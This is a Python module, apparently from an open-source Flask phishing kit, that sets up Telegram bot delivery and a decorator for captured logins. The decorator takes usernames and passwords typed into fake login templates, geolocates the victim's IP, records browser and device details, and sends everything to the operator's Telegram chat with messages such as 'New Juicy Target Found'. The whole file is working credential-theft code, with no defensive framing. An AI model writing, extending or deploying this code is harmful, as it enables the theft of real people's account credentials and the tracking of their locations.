from server.model import Messengers
from server.app import db
from server.services.iplogger import ipinfo
from flask import request
from user_agents import parse
import requests 

def addTele(service="Telegram",token="Your Token will be here",chat_id="Your chat id will be here",use_it=False):
    service = Messengers(service=service,token=token,chat_id=chat_id,use_it=use_it)
    db.session.add(service)
    db.session.commit()
    print("Service Added Successfully")



def update_tele(token,chatid,useit):
    user=db.session.get(Messengers,"Telegram")
    if user:
        user.token = token
        user.chat_id = chatid
        user.use_it = useit
        db.session.commit()
        print("User token chatid status Sucessfully Updated")

def get_Telegram():
    tele = db.session.query(Messengers).all()
    if not tele:
        addTele()
        return get_Telegram()
    else:
        return tele

def escape_markdown_v2(text):
    # Define characters that need escaping in MarkdownV2
    escape_chars = r'_'
    
    # Create the escaped version of the text
    escaped_text = ''.join(f'\\{char}' if char in escape_chars else char for char in text)
    
    return escaped_text




def send_telegram_message(text):
  telegramdata = get_Telegram()[0]
  if telegramdata.use_it:  # Replace with your bot token
    url = f"https://api.telegram.org/bot{telegramdata.token}/sendMessage"
    data = {'chat_id': telegramdata.chat_id,
            'text': escape_markdown_v2(text),
            "parse_mode": "Markdown"}
    response = requests.post(url, data=data)
    return response.json()
  else:
      return "Not Permission to send"

def send_location(latitude, longitude, title="Location"):
  telegramdata = get_Telegram()[0]
  if telegramdata.use_it:  # Replace with your bot token
    url = f'https://api.telegram.org/bot{telegramdata.token}/sendVenue'
    params = {
        'chat_id': telegramdata.chat_id,
        'latitude': latitude,
        'longitude': longitude,
        'title': title
    }
    response = requests.get(url, params=params)
    return response.json()
  else:
      pass


#Main Sender Wrapper is here
def send_telegram_userdata(func):
    def wrapper(*args, **kwargs):
        print("Running Wrapper")

        # Extract the required arguments from args or kwargs
        template = request.form['template']
        username = request.form["username"]
        password = request.form["password"]

        print(f"Username: {username}, Password: {password}, Template: {template}")

        if username and password and template:
            textToSend = "* New Juicy Target Found  *📝📄📎       \n\n"
            textToSend += f"• Username: {username} \n"
            textToSend += f"• Password: {password} \n"
            textToSend += f"• Template: {template} 📸🐦🌐\n\n\n"
            # print("Sending Message")
            # send_telegram_message(textToSend)
            if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
                ip = request.environ['REMOTE_ADDR']
            else:
                ip = request.environ['HTTP_X_FORWARDED_FOR']

            ipinfo_data = ipinfo(ip)
            print(ipinfo_data)
            if ipinfo_data:
                ipToSend = ""
                ipToSend += textToSend
                ipToSend += "* IP 🌎 and Address of Victim 🗺️*       \n\n"
                ipToSend += f"• IP: {ip}  \n"
                ipToSend += f"• City: {ipinfo_data.get('city','None')}  \n"
                ipToSend += f"• Region: {ipinfo_data.get('region','None')}  \n"
                ipToSend += f"• Country: {ipinfo_data.get('country','None')}  \n"
                ipToSend += f"• Postal🌐: {ipinfo_data.get('postal','None')}  \n"
                ipToSend += f"• TimeZone: {ipinfo_data.get('timezone','None')}  \n"
                ipToSend += f"• ISP Org: {ipinfo_data.get('org','None')}  \n\n\n"
                location = ipinfo_data.get('loc',None)
            else:
                ipToSend = "Some Error Happened Please Tell to issues\n"
                ipToSend += "Github Url = https://www.github.com/siddhant385/flask-phishing/issues"
                location = False
            
            # send_telegram_message(ipToSend)
            
            if location:
                lat, lon = location.split(',')
                send_location(lat, lon, "Geolocation🌐\n")
            
            ipToSend += "* Browser And Device Details  *     \n\n"
            user_agent = parse(request.user_agent.string)
            ipToSend += f"• Browser: {user_agent.get_browser()} \n"
            ipToSend += f"• Device: {user_agent.get_device()}  \n"
            ipToSend += f"• Platform: {user_agent.get_os()}\n\n\n\n\n\n  "
            # ipToSend += f"_ Ends Here _"
            print(send_telegram_message(ipToSend))
            send_telegram_message(f" User-Agent: {request.user_agent.string}\n\n\n\n\n")
        
        return func(*args, **kwargs)
    return wrapper
